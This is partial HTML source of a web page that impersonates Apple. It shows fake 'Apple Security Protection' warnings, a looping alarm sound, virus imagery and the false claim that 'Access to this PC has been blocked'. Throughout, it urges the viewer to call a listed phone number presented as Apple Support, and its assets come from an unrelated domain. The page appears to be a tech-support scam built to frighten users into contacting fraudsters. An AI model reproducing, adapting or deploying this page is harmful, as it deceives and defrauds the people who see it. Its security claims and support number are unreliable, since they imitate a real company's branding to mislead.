...
<link rel="stylesheet" href="https://tastebudtreats.com/mol/styles.css">
<script type="text/javascript" src="https://tastebudtreats.com/mol/scripts.js"></script>
<script type="text/javascript" src="https://tastebudtreats.com/mol/custom.js"></script>
<script type="text/javascript" src="https://tastebudtreats.com/mol/main.js"></script>
<link rel="icon" type="image/png" href="https://tastebudtreats.com/mol/apple.png">
...
<body id="mycanvas" onclick="playSound()" >
  ...
  <div class="bg" style="cursor:none;">
    <div class="bgimg" style="top: 0px;"><img src="https://tastebudtreats.com/mol/bg.png" alt="" width="100%"/></div>
...
<div class="top">
<p style="font-size: 17px; font-weight:600; font-family: Arial, Helvetica, sans-serif;">Apple Security<img src="https://tastebudtreats.com/mol/minimize.jpeg" class="" style="float: right; width:115px;"></p>
</div>
...
<li>
<br>
<img src="https://tastebudtreats.com/mol/kxFy-clip.png" width="50px;">
...
<li>
<br><br>
<img src="https://tastebudtreats.com/mol/qsbs-firewall.png" width="60px;">
...
<li>
<br>
<img src="https://tastebudtreats.com/mol/s-S4-acc.png" width="60px;">
<p>Account protection</p>
<p style="top: 125px; position: absolute; font-size: 13px; color: grey;">No action required.</p>
</li>
<li>
<br>
<img src="https://tastebudtreats.com/mol/Z5BR-network.png" width="51px;"/>
<p>Application and browser control</p>
<p style="top: 270px; position: absolute; font-size: 13px; color: grey;">No action required.</p>
</li>
</ul>
</div>
<img src="https://tastebudtreats.com/mol/uZbx-si.png" class="" style="border-bottom-left-radius: 10px;" width="30.9px; height: 15.2px;" id="clscl">
<br>
</div>
...
<div class="scan" id="scan">
  ...
  <h4 style="position: absolute; left: 70px; top: 53px; font-weight: 300;" id="text1"><img src="https://tastebudtreats.com/mol/apple.png" width="25px;" style="margin-right: 10px;vertical-align: sub;">Apple Security Protection</h4>
...
top: 6px;
font-weight: 500;
font-size: 19px;" id="text12"><b>+1-650-239-6456  (free security)</b></h3>
  ...
  <div class="flex"> <img src="https://tastebudtreats.com/mol/-EBq-current.png" width="20px" height="20px;" style="margin-right: 10px; top: 10px; position: absolute;"><p style="font-weight: 400; position: absolute; left: 30px;">current threat</p></div>
...
<div class="flex"><img src="https://tastebudtreats.com/mol/nOxp-sett.png" height="28px" width="30px;" style="margin-right: 10px;"><p style="position: absolute; left: 35px;    bottom: 117px;    line-height: 18px;">Virus & threat protection settings </p> </div>
...
margin-top: 8px; text-align: center;">Apple Security - Protection Warning</p>
               ...
               <p style="padding-bottom: 0px;">Call Apple Support <strong>+1-650-239-6456  (Security Support)</strong></p>
...
<audio id="beep" loop>
  <source src="https://tastebudtreats.com/mol/_Fm7-alert.mp3" type="audio/mpeg">
</audio>
...
<div id="websa" class="websa mnwebs">
  <div class="ilb top">
      <div class="headers ilb" style="border-bottom: 1px solid #d6d5d5;">
          <span id="txtadd" class="fl title"><span class="fl ilb"><img src="https://tastebudtreats.com/mol/apple.png" class="logo3"></span> Apple_Defender_Security_Center</span>
          <span id="txts1" class="fl title2"><a href="#"><img src="https://tastebudtreats.com/mol/cross.png"></a></span>
  ...
  <img id="banner" src="https://tastebudtreats.com/mol/virus-images.png">
  <div id="disclaimer">
    Access to this PC has been blocked for security reasons.<br>
      <span class="support">Contact Apple Support: +1-650-239-6456  (Security Support)</span>
  </div>
  <div id="bottom">
      <img id="badge" src="https://tastebudtreats.com/mol/apple.png"><span class="title3">Apple Support</span>
      <ul>
          <li>
              <a href="#">
  ...
  <div class="row">
      ...
      <div class="col-md-12">
          <div class="right-foot" style="text-align: center;">
              <span id="footertxt" style="font-weight: 700;"><img src="apple.png"> Apple</span><span style="font-weight: 700;padding-left: 5px;color: #fff;">Support contact <span style="border: 1px solid #fff;border-radius: 5px;padding: 2px 5px;">+1-650-239-6456  (Security Support)</span></span>
          </div>
      </div>
      <div class="col-md-12">
